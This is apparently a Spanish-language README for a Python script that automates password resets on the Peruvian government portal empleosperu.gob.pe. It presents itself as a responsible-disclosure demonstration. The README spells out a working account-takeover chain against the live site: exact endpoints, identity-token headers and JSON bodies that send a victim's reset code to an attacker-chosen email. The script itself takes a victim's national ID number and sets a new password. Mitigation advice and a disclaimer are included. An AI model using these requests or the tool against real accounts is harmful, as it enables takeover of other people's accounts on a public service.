# Change Password - EmpleosPeru

Herramienta de **automatización de cambio de contraseña** desarrollada con fines **educativos y de investigación en ciberseguridad**.

> ⚠️ **AVISO DE RESPONSABILIDAD**
>
> Este proyecto se publica **exclusivamente con fines educativos, académicos y de investigación en seguridad informática**. Su objetivo es documentar y demostrar una vulnerabilidad de seguridad real para que los responsables de la plataforma puedan corregirla y para que la comunidad entienda los riesgos de una validación de identidad deficiente.
>
> El uso de esta herramienta contra sistemas, cuentas o usuarios **sin autorización previa y por escrito** es **ilegal** y constituye un delito. El autor **no se hace responsable** del uso indebido que terceros puedan darle. Úsala únicamente en entornos de prueba propios o con permiso explícito.
>
> Si eres responsable de EmpleosPeru o de la plataforma afectada y deseas coordinar la divulgación responsable (responsible disclosure), contacta al autor.

---

## 📌 ¿Qué es?

`Change Password` es un script en Python que automatiza el flujo de restablecimiento de contraseña de la plataforma **EmpleosPeru** (`empleosperu.gob.pe`). Demuestra cómo, ante una validación de identidad débil, es posible solicitar un **cambio de contraseña sobre cuentas de terceros** únicamente conociendo el **DNI** y un **correo electrónico** válido.

---

## 🔓 Vulnerabilidad documentada

### Resumen

La plataforma expone **3 endpoints** de restablecimiento de contraseña que **no realizan una verificación de propiedad** real del correo o de la identidad antes de ejecutar el cambio. Esto permite, en teoría, que un atacante cambie la contraseña de **cualquier usuario** con solo conocer su **DNI** y un **correo** al que tenga acceso.

### Flujo y endpoints involucrados

| # | Endpoint | Método | Propósito |
|---|----------|--------|-----------|
| 1 | `/usermanagement/usuario/resetpassword/verificar` | `GET` | Verifica que el DNI exista y devuelve un **token de identidad** y el **número de celular** registrado. |
| 2 | `/usermanagement/email/enviar` | `POST` | Envía un **código de verificación** a un correo (el que el atacante indique). |
| 3 | `/usermanagement/usuario/resetpassword/confirmar` | `POST` | Confirma el cambio de contraseña usando el código y los datos. |

### Cadena del ataque

1. **`verificar`** — Con el DNI de la víctima se obtiene un token de identidad y el celular registrado:
   ```http
   GET /usermanagement/usuario/resetpassword/verificar?id-documento=10080399&nu-documento={DNI}
   ```

2. **`enviar`** — Se pide el envío del código a un **correo controlado por el atacante**:
   ```http
   POST /usermanagement/email/enviar
   X-Validate-Identity: {token}
   Body: { "nInMotivo": 10140202, "sEmailTo": "atacante@correo.com" }
   ```

3. **`confirmar`** — Con el código recibido se cambia la contraseña de la víctima:
   ```http
   POST /usermanagement/usuario/resetpassword/confirmar
   X-Validate-Identity: {token}
   Body: {
     "sCodigoEmail": "{codigo}",
     "sNuDocIdentidad": "{DNI}",
     "sEmail": "atacante@correo.com",
     "sPassword": "nueva-contrasena",
     ...
   }
   ```

### ¿Por qué es crítica?

- **No se valida la propiedad del correo**: el código se envía a un correo que el atacante elige libremente, no al correo originalmente registrado por la víctima.
- **El DNI es el único "factor"**: el DNI no es un secreto (es un dato público/semi-público en Perú), por lo que no califica como factor de autenticación.
- **Afectación masiva**: al conocer solo un DNI + un correo propio, es posible comprometer la cuenta.
- **El token de identidad** no está ligado a la sesión del propietario real de la cuenta.

### Recomendaciones de mitigación

- Enviar el código **únicamente al correo/celular registrado** en la cuenta.
- No devolver datos sensibles (como el número de celular) en respuestas de verificación.
- Agregar verificación de **propiedad del correo** antes de generar el token.
- Implementar **límites de intentos** y **detección de abuso** en los endpoints.
- Requerir autenticación adicional (OTP al número registrado) antes de permitir el cambio.

---

## 🚀 Requisitos

- Python 3.8+
- Las dependencias de `venv`

## 📦 Instalación

```bash
# Crear y activar entorno virtual
python -m venv venv
# Windows
venv\Scripts\activate
# Linux/macOS
source venv/bin/activate

# Instalar dependencias
pip install -r requirements.txt
```

## ▶️ Uso

```bash
python main.py
```

El script pedirá:
1. **DNI** del usuario.
2. **Correo electrónico** al que se enviará el código.
3. El **código de verificación** recibido.
4. La **nueva contraseña**.

## 🗂️ Estructura del proyecto

```
change-pass/
├── main.py                    # Entry point / orquestador del flujo
├── config.py                  # Constantes y cabeceras de API
├── requirements.txt           # Dependencias
├── .gitignore
└── ui/
│   ├── __init__.py
│   ├── display.py             # Banner, cajas, paneles, mensajes
│   └── prompts.py             # Inputs interactivos
└── services/
    ├── __init__.py
    └── password_changer.py    # Lógica de API (verificar/enviar/cambiar)
```

## ⚖️ Declaración legal

Este software se proporciona **tal cual**, sin garantías, **solo con fines educativos**. No debe utilizarse para actividades ilegales o no autorizadas. El uso indebido es responsabilidad exclusiva de quien lo realice.

---

**Autor:** SYLAR · Ciberseguridad
